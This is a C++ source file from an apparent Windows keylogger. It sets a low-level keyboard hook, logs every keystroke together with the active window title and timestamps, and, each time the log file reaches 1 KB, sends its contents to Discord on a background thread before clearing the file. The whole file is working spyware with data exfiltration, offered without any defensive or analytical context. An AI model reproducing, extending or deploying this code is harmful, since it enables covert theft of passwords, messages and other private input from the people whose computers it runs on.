#include "../include/hook.h"
#include "../include/discord.h"
#include "../include/key_mapping.h"
#include "../include/keyboard_state.h"
#include "../include/logger.h"
#include "../include/utils.h"
#include "../include/window_tracking.h"

#include <chrono>
#include <iostream>
#include <thread>

LRESULT CALLBACK LowLevelKeyboardProc ( int code, WPARAM wParam, LPARAM lParam )
{
  SHORT getcapsLockStatus = GetKeyState ( VK_CAPITAL );

  if ( ( getcapsLockStatus & 0x0001 ) != 0 )
  {
    KeyboardState::capsLock = true;
  }
  else
  {
    KeyboardState::capsLock = false;
  }

  KBDLLHOOKSTRUCT *keyboardData = reinterpret_cast<KBDLLHOOKSTRUCT *> ( lParam );

  if ( code == HC_ACTION )
  {
    if ( keyboardData->vkCode == VK_LSHIFT || keyboardData->vkCode == VK_RSHIFT )
    {
      if ( wParam == WM_KEYDOWN )
      {
        KeyboardState::shift = true;
      }
      else
      {
        KeyboardState::shift = false;
      }
    }

    if ( wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN )
    {
      HWND currentWindow = GetForegroundWindow ();

      if ( currentWindow != WindowTracking::lastWindow )
      {
        int windowTitle = GetWindowTextA (
            currentWindow,
            WindowTracking::windowTitle,
            sizeof ( WindowTracking::windowTitle ) );

        Logger::output << "[ Current Window ]: " << WindowTracking::windowTitle << '\n';
        Logger::output << "[ Current Date   ]: " << parseDate () << '\n';
        Logger::output << '\n';
        Logger::output << "Keylogging...";
        Logger::output << '\n';

        Logger::outputFile << Logger::output.str ();
        std::cout << Logger::output.str ();

        WindowTracking::lastWindow = currentWindow;
      }

      if ( keyboardData->vkCode )
      {
        static auto lastKeystrokeTime = std::chrono::system_clock::now ();
        auto now = std::chrono::system_clock::now ();
        auto elapsed = std::chrono::duration_cast<std::chrono::seconds> ( now - lastKeystrokeTime ).count ();

        Logger::output.str ( "" );

        if ( elapsed > 5 )
        {
          Logger::output << '\n'
                         << "<" << parseDate () << ">" << '\n';
          lastKeystrokeTime = now;
        }

        Logger::output << hookCode ( keyboardData->vkCode, KeyboardState::capsLock, KeyboardState::shift );
        lastKeystrokeTime = now;

        Logger::outputFile << Logger::output.str ();
        Logger::outputFile.flush ();

        std::cout << Logger::output.str ();
      }

      ULONGLONG oneKB{ 1ULL * 1024 };

      if ( checkFileSize ( Logger::fileName, oneKB ) )
      {
        Logger::outputFile.close ();

        std::string data{ parseData ( Logger::fileName ) };

        std::thread myThread ( sendDataToDiscord, data );
        myThread.detach ();

        std::ofstream clearFile ( Logger::fileName, std::ios::out | std::ios::trunc );
        clearFile.close ();

        Logger::outputFile.open ( Logger::fileName, std::ios::out | std::ios::app );
      }
    }
  }

  return CallNextHookEx ( NULL, code, wParam, lParam );
}
